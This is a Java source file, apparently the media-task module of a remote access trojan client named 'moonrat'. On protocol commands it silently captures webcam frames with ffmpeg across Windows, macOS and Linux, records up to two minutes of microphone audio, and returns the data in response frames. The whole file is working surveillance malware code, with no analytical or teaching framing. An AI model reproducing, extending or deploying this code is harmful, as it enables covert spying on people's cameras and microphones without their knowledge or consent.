package moonrat.client.tasks;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;
import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.DataLine;
import javax.sound.sampled.TargetDataLine;
import moonrat.Protocol;
import moonrat.Protocol.Frame;

public final class MediaTasks {
    private static final int SAMPLE_RATE = 16000;

    private MediaTasks() {}

    public static Frame snap(String camera) {
        Frame response = new Frame(Protocol.CAM_RESP);
        try {
            response.blob = captureFrame(camera);
            response.fields = new ArrayList<>(List.of(""));
        } catch (Exception failure) {
            response.fields = new ArrayList<>(List.of(String.valueOf(failure)));
        }
        return response;
    }

    public static Frame record(String seconds) {
        Frame response = new Frame(Protocol.MIC_RESP);
        try {
            int duration = Math.max(1, Math.min(120, parseInt(seconds, 5)));
            response.blob = recordAudio(duration);
            response.fields = new ArrayList<>(List.of(""));
        } catch (Exception failure) {
            response.fields = new ArrayList<>(List.of(String.valueOf(failure)));
        }
        return response;
    }

    private static byte[] captureFrame(String camera) throws Exception {
        if (isWindows()) {
            String device = firstDshowVideoDevice();
            List<String> command = new ArrayList<>(List.of("ffmpeg", "-hide_banner", "-loglevel", "error",
                    "-y", "-f", "dshow", "-i", "video=" + device, "-frames:v", "1", "-f", "mjpeg", "pipe:1"));
            try {
                return runForBytes(command, 40);
            } catch (Exception dshowFailed) {
                return runForBytes(List.of("ffmpeg", "-hide_banner", "-loglevel", "error",
                        "-y", "-f", "vfwcap", "-i", "0", "-frames:v", "1", "-f", "mjpeg", "pipe:1"), 40);
            }
        }

        if (isMac()) {
            return runForBytes(List.of("ffmpeg", "-hide_banner", "-loglevel", "error",
                    "-y", "-f", "avfoundation", "-i",
                    camera == null || camera.isBlank() ? "0" : camera,
                    "-frames:v", "1", "-f", "mjpeg", "pipe:1"), 40);
        }

        String device = camera == null || camera.isBlank() ? "/dev/video0" : camera;
        return runForBytes(List.of("ffmpeg", "-hide_banner", "-loglevel", "error",
                "-y", "-f", "v4l2", "-i", device, "-frames:v", "1", "-f", "mjpeg", "pipe:1"), 40);
    }

    private static String firstDshowVideoDevice() throws Exception {
        ProcessBuilder builder = new ProcessBuilder("ffmpeg", "-hide_banner", "-list_devices", "true",
                "-f", "dshow", "-i", "dummy");
        builder.redirectErrorStream(true);
        Process process = builder.start();
        String output = consume(process);
        process.waitFor(20, TimeUnit.SECONDS);

        for (String line : output.split("\n")) {
            int nameEnd = line.lastIndexOf("\" (video");
            int nameStart = line.indexOf("\"");
            if (nameEnd > nameStart && nameStart >= 0) {
                return line.substring(nameStart + 1, nameEnd);
            }
        }
        throw new IOException("no dshow video device");
    }

    private static byte[] runForBytes(List<String> command, int timeoutSeconds) throws Exception {
        ProcessBuilder builder = new ProcessBuilder(command);
        builder.redirectErrorStream(false);
        Process process = builder.start();

        ByteArrayOutputStream errors = new ByteArrayOutputStream();
        Thread errorPump = new Thread(() -> {
            try (InputStream in = process.getErrorStream()) {
                in.transferTo(errors);
            } catch (IOException ignored) {
            }
        });
        errorPump.setDaemon(true);
        errorPump.start();

        byte[] output;
        try (InputStream in = process.getInputStream()) {
            output = in.readAllBytes();
        }
        if (!process.waitFor(timeoutSeconds, TimeUnit.SECONDS)) {
            process.destroyForcibly();
            throw new IOException("ffmpeg timeout");
        }
        if (process.exitValue() != 0 || output.length == 0) {
            String message = errors.toString(StandardCharsets.UTF_8).trim();
            throw new IOException(message.isBlank() ? ("ffmpeg exit " + process.exitValue()) : message);
        }
        return output;
    }

    private static byte[] recordAudio(int seconds) throws Exception {
        AudioFormat format = new AudioFormat(SAMPLE_RATE, 16, 1, true, false);
        DataLine.Info info = new DataLine.Info(TargetDataLine.class, format);
        if (!AudioSystem.isLineSupported(info)) throw new IOException("no microphone available");

        TargetDataLine line = (TargetDataLine) AudioSystem.getLine(info);
        line.open(format);
        line.start();

        ByteArrayOutputStream pcm = new ByteArrayOutputStream();
        byte[] buffer = new byte[4096];
        long target = (long) SAMPLE_RATE * 2 * seconds;
        long collected = 0;
        long deadline = System.currentTimeMillis() + seconds * 1000L + 2000;

        while (collected < target && System.currentTimeMillis() < deadline) {
            int read = line.read(buffer, 0, buffer.length);
            if (read <= 0) break;
            pcm.write(buffer, 0, read);
            collected += read;
        }

        line.stop();
        line.close();
        return wav(pcm.toByteArray());
    }

    private static byte[] wav(byte[] pcm) {
        int total = 36 + pcm.length;
        byte[] header = new byte[44];
        write(header, 0, "RIFF");
        putInt(header, 4, total);
        write(header, 8, "WAVE");
        write(header, 12, "fmt ");
        putInt(header, 16, 16);
        putShort(header, 20, (short) 1);
        putShort(header, 22, (short) 1);
        putInt(header, 24, SAMPLE_RATE);
        putInt(header, 28, SAMPLE_RATE * 2);
        putShort(header, 32, (short) 2);
        putShort(header, 34, (short) 16);
        write(header, 36, "data");
        putInt(header, 40, pcm.length);

        byte[] file = new byte[44 + pcm.length];
        System.arraycopy(header, 0, file, 0, 44);
        System.arraycopy(pcm, 0, file, 44, pcm.length);
        return file;
    }

    private static void write(byte[] target, int offset, String tag) {
        for (int index = 0; index < tag.length(); index++) {
            target[offset + index] = (byte) tag.charAt(index);
        }
    }

    private static void putInt(byte[] target, int offset, int value) {
        target[offset] = (byte) value;
        target[offset + 1] = (byte) (value >> 8);
        target[offset + 2] = (byte) (value >> 16);
        target[offset + 3] = (byte) (value >> 24);
    }

    private static void putShort(byte[] target, int offset, short value) {
        target[offset] = (byte) value;
        target[offset + 1] = (byte) (value >> 8);
    }

    private static String consume(Process process) {
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        try (InputStream in = process.getInputStream()) {
            in.transferTo(buffer);
        } catch (IOException ignored) {
        }
        return buffer.toString(StandardCharsets.UTF_8);
    }

    private static int parseInt(String value, int fallback) {
        try {
            return Integer.parseInt(value);
        } catch (Exception failure) {
            return fallback;
        }
    }

    private static boolean isWindows() {
        return System.getProperty("os.name").toLowerCase().contains("win");
    }

    private static boolean isMac() {
        return System.getProperty("os.name").toLowerCase().contains("mac");
    }
}
